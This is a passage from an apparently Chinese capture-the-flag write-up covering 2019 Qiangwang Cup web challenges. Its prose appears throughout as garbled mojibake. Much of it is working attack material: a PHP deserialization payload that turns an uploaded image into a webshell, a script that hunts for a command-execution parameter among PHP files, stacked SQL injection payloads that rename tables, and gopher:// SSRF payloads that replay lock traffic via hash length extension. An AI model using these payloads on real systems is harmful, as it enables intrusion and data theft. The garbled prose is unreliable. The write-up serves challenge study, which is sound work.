class="string">"post.password"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span></span><br><span class="line"><span class="php">            $username = input(<span class="string">"post.username"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check_email($email)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">if</span> (<span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"username"</span>, $username)-&gt;find()) &amp;&amp; <span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"email"</span>, $email)-&gt;find())) &#123;</span></span><br><span class="line"><span class="php">                    $user_info = [<span class="string">"email"</span> =&gt; $email, <span class="string">"password"</span> =&gt; md5($password), <span class="string">"username"</span> =&gt; $username];</span></span><br><span class="line"><span class="php">                    <span class="keyword">if</span> (db(<span class="string">"user"</span>)-&gt;insert($user_info)) &#123;</span></span><br><span class="line"><span class="php">                        <span class="keyword">$this</span>-&gt;registed = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">                        <span class="keyword">$this</span>-&gt;success(<span class="string">'Registed successful!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">                        <span class="keyword">$this</span>-&gt;error(<span class="string">'Registed failed!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">                    &#125;</span></span><br><span class="line"><span class="php">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">                    <span class="keyword">$this</span>-&gt;error(<span class="string">'Account already exists!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Email illegal!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Something empty!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_email</span><span class="params">($email)</span></span>&#123;</span></span><br><span class="line"><span class="php">        $pattern = <span class="string">"/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]&#123;2,&#125;)$/"</span>;</span></span><br><span class="line"><span class="php">        preg_match($pattern, $email, $matches);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">empty</span>($matches))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="number">1</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$check = <span class="keyword">new</span> Register();</span></span><br><span class="line"><span class="php">$check-&gt;registed=<span class="number">0</span>;</span></span><br><span class="line"><span class="php">$check-&gt;checker=<span class="keyword">new</span> Profile();</span></span><br><span class="line"><span class="php">$check-&gt;checker-&gt;except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span></span><br><span class="line"><span class="php">$check-&gt;checker-&gt;ext=<span class="number">1</span>;</span></span><br><span class="line"><span class="php">$check-&gt;checker-&gt;filename_tmp=<span class="string">"./upload/da5703ef349c8b4ca65880a05514ff89/0412c29576c708cf0155e8de242169b1.png"</span>;</span></span><br><span class="line"><span class="php">$check-&gt;checker-&gt;filename=<span class="string">"./upload/da5703ef349c8b4ca65880a05514ff89/0412c29576c708cf0155e8de242169b1.php"</span>;</span></span><br><span class="line"><span class="php">$payload = base64_encode(serialize($check));</span></span><br><span class="line"><span class="php">print_r($payload);</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨æˆåŠŸåç›´æ¥å°†jpgæ–‡ä»¶copyä¸ºphpæ–‡ä»¶ï¼Œå°±å¯ä»¥è§¦å‘ä¸€å¥è¯æœ¨é©¬äº†ï¼ˆæˆ‘éƒ½ä¸çŸ¥é“æˆ‘ä¸ºä½•è¦ä¼ ä¸€ä¸ª601Kçš„æ–‡ä»¶ï¼Œæ‰§è¡Œå‘½ä»¤å¡é£äº†ï¼‰</p>
<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-198f997db8417b65.png" alt> </p>
<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-99541919517273a6.png" alt> </p>
<p>è¿™ä¸ªé¢˜ç›®ç¯å¢ƒä¼šæœ‰é—®é¢˜ï¼Œå†åŠ ä¸Šæˆ‘æœ¬åœ°namespaceç¯å¢ƒå‡ºäº†ä¸¢ä¸¢é—®é¢˜ï¼ŒæˆåŠŸè®©æˆ‘ä¸¢äº†2è¡€æ‹¿äº†4è¡€ï¼Œéš¾å—ã€‚</p>
<h3 id="0x02-é«˜æ˜çš„é»‘å®¢"><a href="#0x02-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="0x02 é«˜æ˜çš„é»‘å®¢"></a>0x02 é«˜æ˜çš„é»‘å®¢</h3><p>ä¸‹è½½<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a>åå‘ç°æ˜¯3000å¤šä¸ªâ€œæœ¨é©¬â€æ–‡ä»¶ï¼Œç®€å•å®¡è®¡ä¸€ä¸‹å‘ç°è™½ç„¶æœ‰å¾ˆå¤šå‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹ï¼Œä½†åœ¨æ­¤ä¹‹å‰éƒ½å·²ç»å°†GETæˆ–POSTå‚æ•°èµ‹ç©ºå€¼ï¼Œæˆ–è€…åŠ ä¸Šæ’ä¸ºå‡çš„ifåˆ¤æ–­ï¼Œåœ¨äºæ‰¾ä¸åˆ°è·¯çš„æ—¶å€™åˆè‚¯å®šä¸æ˜¯æ¯ä¸ªéƒ½å»çœ‹çš„æƒ…å†µä¸‹ï¼Œäºæ˜¯ä¹å†™äº†ä¸ªè„šæœ¬æå–æ¯ä¸ªæ–‡ä»¶ä¸­çš„GETã€POSTå‚æ•°ï¼Œè¿™äº›å‚æ•°å¯èƒ½ä¼ å…¥çš„æ˜¯assertå’Œevalï¼Œæˆ–è€…ä¼ å…¥äº†systemå’Œåå¼•å·ï¼Œåˆ©ç”¨æœ¬åœ°æµ‹è¯•åˆ¤æ–­èƒ½å¦å‘½ä»¤æ‰§è¡Œï¼Œæœ€ç»ˆåœ¨æµ‹è¯•GETå‚æ•°çš„è¿‡ç¨‹ä¸­å‘ç°å…¶ä¸­ä¸€ä¸ªèƒ½ç”¨çš„shellå¹¶ä¸”è·å¾—å…¶å‚æ•°ï¼Œæ˜¯ç›´æ¥å‘½ä»¤æ‰§è¡Œçš„ï¼Œè¢«è‡ªå·±æ“ä½œéªšåˆ°ã€‚è¿™é‡Œè´´ä¸‹è·‘å‡ºè¿™ä¸ªçš„è„šæœ¬ï¼ˆVery easyï¼Œå†™äº†å¥½å‡ ä¸ªä¸€èµ·è·‘çš„ï¼‰</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">from time import sleep</span><br><span class="line">flies = os.listdir(<span class="string">'./src'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flies:</span><br><span class="line">	url = <span class="string">'http://127.0.0.1/src/'</span>+i</span><br><span class="line">	f = open(<span class="string">'./src/'</span>+i)</span><br><span class="line">	data = f.read()</span><br><span class="line">	f.close()</span><br><span class="line">	reg = re.compile(<span class="string">r'(?&lt;=_GET\[\').*(?=\'\])'</span>)</span><br><span class="line">	params = reg.findall(data)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> params:	</span><br><span class="line">		payload = url + <span class="string">'/?'</span> + j + <span class="string">'=echo 123456123456123456123456'</span></span><br><span class="line">		print payload</span><br><span class="line">		req=requests.get(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'123456123456123456123456'</span> <span class="keyword">in</span> req.content:</span><br><span class="line">			print payload</span><br><span class="line">			<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-385ff2ec17cdd5b4.png" alt><br>ç›´æ¥æ‹¿å»ç¯å¢ƒ<code>cat /flag</code>ä¸‹å°±å¥½äº†ï¼Œæœ€åæ¡äº†ä¸ªç¬¬å…­è§£ï¼Œè¿™é¢˜çš„æ­£è§£æ˜¯PHPåŠ¨æ€è°ƒç”¨åˆ†æï¼Œå°±ä¸å†ä»‹ç»äº†<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-af195b540775b21d.png" alt> </p>
<h3 id="0x03-éšä¾¿æ³¨"><a href="#0x03-éšä¾¿æ³¨" class="headerlink" title="0x03 éšä¾¿æ³¨"></a>0x03 éšä¾¿æ³¨</h3><p>å¦‚é¢˜åæè¿°ï¼Œæ˜¯ä¸€é“æ³¨å…¥é¢˜ï¼ˆæ³¨ä¸å‡ºæ¥çš„æ—¶å€™ä¸€åº¦æ€€ç–‘é¢˜ç›®åå…¨ç§°æ˜¯ä¸æ˜¯ï¼Œéšä¾¿æ³¨ï¼Œåæ­£ä½ æ³¨ä¸å‡ºæ¥ï¼‰ï¼ŒFuzzä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°è¿‡æ»¤è§„åˆ™<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;, $inject);</code>æ‰€ä»¥å°±æ˜¯æ²¡æ³•é€šè¿‡selectå’Œâ€™.â€™æ¥è¯»è¡¨å’Œæ•°æ®çš„æ„æ€å’¯ï¼Œä¸è¿‡å¯ä»¥é€šè¿‡æŠ¥é”™æ³¨å…¥å‡ºæ¥çš„æ•°æ®åº“åï¼ˆsupersqliï¼‰ã€ç”¨æˆ·ç­‰ä¿¡æ¯ï¼ˆæœç„¶æ˜¯éšä¾¿æ³¨ï¼‰ï¼Œæ‰€ä»¥æ‰§è¡Œçš„SQLè¯­å¥è‚¯å®šæ˜¯<code>select * from supersqli.table_name where id=&#39;&#39; ;</code>ä¸€ç•ªäº‘é›¨æµ‹è¯•åï¼Œç¡®å®šäº†è¿™æ˜¯ä¸€ä¸ªå †å æ³¨å…¥ï¼Œå°±æ˜¯å¯ä»¥ä¸€æ¬¡æ€§æ‰§è¡Œå¤šæ¡sqlè¯­å¥ï¼Œ</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">â€™;<span class="keyword">show</span> <span class="keyword">tables</span> <span class="keyword">from</span> supersqli;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°æ‰€æœ‰è¡¨åï¼Œå¦ä¸€å¼ è¡¨åæ˜¯1919810931114514</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">â€™;<span class="keyword">show</span> cloumns <span class="keyword">from</span> <span class="number">1919810931114514</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°äº†1919810931114514è¡¨ä¸­çš„æ‰€æœ‰åˆ—åï¼Œå…¶ä¸­åŒ…å«äº†flagåˆ—ï¼Œæœ€åæ“ä½œçš„æ€è·¯æ˜¯ï¼ŒæŠŠ1919810931114514è¡¨æ”¹åä¸ºwordsï¼Œè¿™æ ·åœ¨åå°SQLè¯­å¥ä¸å˜çš„æƒ…å†µä¸‹ä»ç„¶å¯ä»¥æŸ¥è¯¢å¾—åˆ°flagçš„å†…å®¹ï¼Œæ”¹æˆwordså‰å¾—å…ˆæŠŠwordsæ”¹æˆå…¶ä»–çš„ï¼Œå¦‚æœä¸€æ¡ä¸€æ¡æ‰§è¡Œï¼Œé‚£æ”¹å®Œwordsé¢˜ç›®å°±å´©äº†ï¼Œæ‰€ä»¥ä¸€æ ·å †å æ‰§è¡Œï¼Œä¸€æ¬¡æ€§å®Œæˆåœ¨1919810931114514ä¸­æ’å…¥idåˆ—ï¼Œwordsæ”¹åï¼Œ1919810931114514æ”¹ä¸ºwordsï¼Œpayloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">';<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">ADD</span> <span class="string">`id`</span> <span class="built_in">INT</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'1'</span> <span class="keyword">AFTER</span> <span class="string">`flag`</span>;%23';<span class="keyword">alter</span>+<span class="keyword">table</span>+<span class="string">`1919810931114514`</span>+<span class="keyword">rename</span>+<span class="keyword">to</span>+<span class="string">`xxx`</span>;<span class="keyword">alter</span>+<span class="keyword">table</span>+<span class="string">`words`</span>+<span class="keyword">rename</span>+<span class="keyword">to</span>+<span class="string">`zzz`</span>;<span class="keyword">alter</span>+<span class="keyword">table</span>+<span class="string">`xxx`</span>+<span class="keyword">rename</span>+<span class="keyword">to</span>+<span class="string">`words`</span>;</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥æŸ¥è¯¢å°±å¯ä»¥å¾—åˆ°åŸ1919810931114514è¡¨ä¸­çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯flagäº†ã€‚</p>
<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-97f586831178c4a6.png" alt> </p>
<h3 id="0x04-ä¸Šå•"><a href="#0x04-ä¸Šå•" class="headerlink" title="0x04 ä¸Šå•"></a>0x04 ä¸Šå•</h3><p>thinkphp5.0.*ä»»æ„ä»£ç æ‰§è¡Œï¼ŒEXPä¸€æŠŠæ¢­å°±å¥½äº†<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-547a629c6d103376.png" alt> </p>
<h3 id="0x05-æ™ºèƒ½é—¨é”"><a href="#0x05-æ™ºèƒ½é—¨é”" class="headerlink" title="0x05 æ™ºèƒ½é—¨é”"></a>0x05 æ™ºèƒ½é—¨é”</h3><p>(è‡ªå·±æ²¡å›¾ï¼Œç›—äº†W&amp;Må¤§å…„å¼Ÿä»¬çš„å›¾)<br>è¿™é¢˜åœ¨æ¯”èµ›æœŸé—´çš„æ€è·¯è¢«å¸¦é”™äº†ï¼Œè¿™é‡ŒæŠŠæ“ä½œå†™ä¸€ä¸‹ã€‚åœ¨åˆšå¼€å§‹çš„æ—¶å€™éé¢„æœŸæ‹¿åˆ°äº†schoolé‚£çš„ä¸€ä¸ªæµé‡åŒ…ï¼Œå‡ºé¢˜äººæ²¡åŠ forbiddenï¼Œæ‰€ä»¥è®¿é—®åˆ°uploadsçš„æ—¶å€™å°±ç›´æ¥åˆ—å‡ºæ¥äº†ï¼Œå› ä¸ºschoolåšäº†ipé™åˆ¶ï¼Œ<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-53605ba2d1bf6418.jpg" alt><br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-0707e17ce211140a.jpg" alt></p>
<p>æ‰€ä»¥è¿›å…¥schoolçš„æ—¶å€™éœ€è¦è®¾ç½®clint-ipè¿›è¡Œè®¿é—®ï¼Œå½“æ—¶æ‹¿åˆ°æµé‡åŒ…çš„æ—¶å€™å› ä¸ºè¶…å‰äº†ï¼Œä¸çŸ¥é“æœ‰å•¥ç”¨â€¦â€¦ï¼ˆè™½ç„¶è¯´åæ¥ä¹Ÿä¸çŸ¥é“æœ‰å•¥ç”¨ï¼‰ï¼Œé€šè¿‡åˆ†ææµé‡åŒ…æˆ‘ä»¬çŸ¥é“äº†é—¨é”çš„IPä»¥åŠç«¯å£è¿˜æœ‰å‘é€çš„æ•°æ®ã€‚</p>
<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-591b16b6c207cc57.jpg" alt title="å›¾ç‰‡"><br>å¹¶ä¸”è¿›å…¥demoçš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹è½½å›ºä»¶v2çš„åœ°å€ï¼Œä¸è¿‡åˆæç¤ºè¯´v2ä¿®å¤äº†æ¼æ´ï¼Œé‚£æ„æ€å°±æ˜¯è¯´v1çš„æœ‰æ´äº†ï¼Œä¸‹è½½é“¾æ¥ä¸ŠæŠŠv2æ”¹æˆv1å°±å¯ä»¥ä¸‹è½½åˆ°v1äº†ï¼Œæ‰€ä»¥æ„æ€å°±æ˜¯æ€¼å›ºä»¶å’¯ï¼Œä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶æ”¹åç¼€ä¸ºzipï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªhexæ–‡ä»¶ï¼Œä¸€ç•ªäº‘é›¨ï¼Œå¯¹webç‹—æ¥è¯´å¤ªéš¾äº†ï¼Œä¸è¿‡æˆ‘ä»¬æœ‰v1çš„æµé‡åŒ…äº†ï¼Œv1å’Œv2å¼€é—¨æµé‡åº”è¯¥æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬åªè¦æ”¹ä¸€ä¸ªç‰ˆæœ¬å·å°±è¡Œäº†ï¼Œå¦‚æœå¯ä»¥ç¯¡æ”¹é—¨é”çš„æ—¶é—´æˆ³å°±å¯ä»¥è¿›è¡Œé‡æ”¾ï¼Œç„¶åè¿™é‡Œçš„ç­¾åæ–¹æ³•æ˜¯å­˜åœ¨å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ã€‚ï¼Œæˆ‘ä»¬ç›´æ¥æ‹¿æµé‡åŒ…é‡Œé¢åŒæ­¥æ—¶é—´æˆªçš„æ•°æ®åŒ…å»è¿›è¡Œæ‰©å±•æ”»å‡»ï¼Œæ‰€ä»¥payloadä¸º</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">/get_info.php?url=gopher://<span class="number">10.2</span>.<span class="number">3.103</span>:<span class="number">2333</span>/_<span class="symbol">%26</span><span class="symbol">%02</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%12</span></span><br><span class="line">/get_info.php?url=gopher://<span class="number">10.2</span>.<span class="number">3.103</span>:<span class="number">2333</span>/_<span class="symbol">%AC</span><span class="symbol">%02</span><span class="symbol">%B5</span><span class="symbol">%5</span>E<span class="symbol">%97</span><span class="symbol">%0</span>E<span class="symbol">%D5</span><span class="symbol">%8</span>B<span class="symbol">%92</span><span class="symbol">%3</span>F<span class="symbol">%2</span>C<span class="symbol">%27</span><span class="symbol">%02</span><span class="symbol">%BD</span><span class="symbol">%C8</span><span class="symbol">%87</span><span class="symbol">%1</span>B<span class="symbol">%5</span>E<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%BA</span><span class="symbol">%B8</span><span class="symbol">%A2</span><span class="symbol">%EA</span><span class="symbol">%6</span>B<span class="symbol">%4</span>C<span class="symbol">%72</span><span class="symbol">%BD</span><span class="symbol">%D4</span><span class="symbol">%9</span>D<span class="symbol">%6</span>D<span class="symbol">%4</span>D<span class="symbol">%4</span>F<span class="symbol">%CF</span><span class="symbol">%5</span>C<span class="symbol">%CB</span><span class="symbol">%DA</span><span class="symbol">%D1</span><span class="symbol">%10</span><span class="symbol">%80</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%A8</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%04</span><span class="symbol">%66</span><span class="symbol">%2</span>D<span class="symbol">%38</span><span class="symbol">%22</span></span><br><span class="line">/get_info.php?url=gopher://<span class="number">10.2</span>.<span class="number">3.103</span>:<span class="number">2333</span>/_<span class="symbol">%28</span><span class="symbol">%02</span><span class="symbol">%70</span><span class="symbol">%C8</span><span class="symbol">%96</span><span class="symbol">%BB</span><span class="symbol">%5</span>A<span class="symbol">%A8</span><span class="symbol">%44</span><span class="symbol">%F8</span><span class="symbol">%48</span><span class="symbol">%CD</span><span class="symbol">%EE</span><span class="symbol">%8</span>C<span class="symbol">%05</span><span class="symbol">%42</span><span class="symbol">%BF</span><span class="symbol">%43</span><span class="symbol">%8</span>D<span class="symbol">%3</span>C<span class="symbol">%8</span>A<span class="symbol">%A7</span><span class="symbol">%E4</span><span class="symbol">%3</span>B<span class="symbol">%D0</span><span class="symbol">%9</span>C<span class="symbol">%E4</span><span class="symbol">%E4</span><span class="symbol">%35</span><span class="symbol">%1</span>D<span class="symbol">%B0</span><span class="symbol">%00</span><span class="symbol">%E7</span><span class="symbol">%FF</span><span class="symbol">%5</span>C<span class="symbol">%CB</span><span class="symbol">%DA</span><span class="symbol">%D2</span><span class="symbol">%20</span><span class="symbol">%01</span><span class="symbol">%F0</span></span><br></pre></td></tr></table></figure>
<h3 id="0x06-babywebbb"><a href="#0x06-babywebbb" class="headerlink" title="0x06 babywebbb"></a>0x06 babywebbb</h3><p>è¿™é¢˜ä¸€å¼€å§‹è·¯èµ°é”™äº†ï¼ˆæ¯æ­»ï¼‰ï¼Œè¯ä¹¦é‡Œå†™äº†52dandan.xyzï¼Œå»å¹´æ˜¯52dandan.ccï¼Œæ‰€ä»¥è‚¯å®šæ˜¯ä¸ªæ¸—é€é¢˜ï¼Œåœ¨<a href="http://www.52dandan.xyzä¸Šæ‰«äº†ä¸€æ³¢ï¼Œå‘ç°äº†å„ç§ææƒè„šæœ¬ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯è¦æ€¼ä¸‹www.52dandan.xyzï¼Œç„¶ååœ¨å†…ç½‘å¯¹é¢˜ç›®" target="_blank" rel="noopener">www.52dandan.xyzä¸Šæ‰«äº†ä¸€æ³¢ï¼Œå‘ç°äº†å„ç§ææƒè„šæœ¬ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯è¦æ€¼ä¸‹www.52dandan.xyzï¼Œç„¶ååœ¨å†…ç½‘å¯¹é¢˜ç›®</a>â€¦â€¦<br>ç¬¬äºŒå¤©æ‰çŸ¥é“åŸæ¥ä¸æ˜¯<a href="http://www.52dandan.xyzï¼Œæ˜¯qqwwwwbbbb.52dandan.xyz......æ‰€ä»¥æ”¹ä¸‹hostså°±å¯ä»¥è®¿é—®åˆ°é¢˜ç›®äº†ï¼Œå¹¶ä¸”å‰æœŸæ‰«ç«¯å£çš„æ—¶å€™873æ˜¯å¼€çš„ï¼Œåˆšå¥½æœ‰rsyncæ³„æ¼ï¼Œé‡Œé¢å¯ä»¥ä¸‹è½½åˆ°qqwwwwbbbb.52dandan.xyzä¸Šçš„æºç ï¼Œåˆ†ææºç å…¶ä¸­graphQLçš„APIæœåŠ¡å­˜åœ¨æ³¨å…¥ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨ä¸‡èƒ½å¯†ç ç™»å½•ï¼Œå¹¶ä¸”user.pyä¸Šæœ‰ä¸ªsystemæ“ä½œï¼Œå¯ä»¥ç›´æ¥ssrf" target="_blank" rel="noopener">www.52dandan.xyzï¼Œæ˜¯qqwwwwbbbb.52dandan.xyz......æ‰€ä»¥æ”¹ä¸‹hostså°±å¯ä»¥è®¿é—®åˆ°é¢˜ç›®äº†ï¼Œå¹¶ä¸”å‰æœŸæ‰«ç«¯å£çš„æ—¶å€™873æ˜¯å¼€çš„ï¼Œåˆšå¥½æœ‰rsyncæ³„æ¼ï¼Œé‡Œé¢å¯ä»¥ä¸‹è½½åˆ°qqwwwwbbbb.52dandan.xyzä¸Šçš„æºç ï¼Œåˆ†ææºç 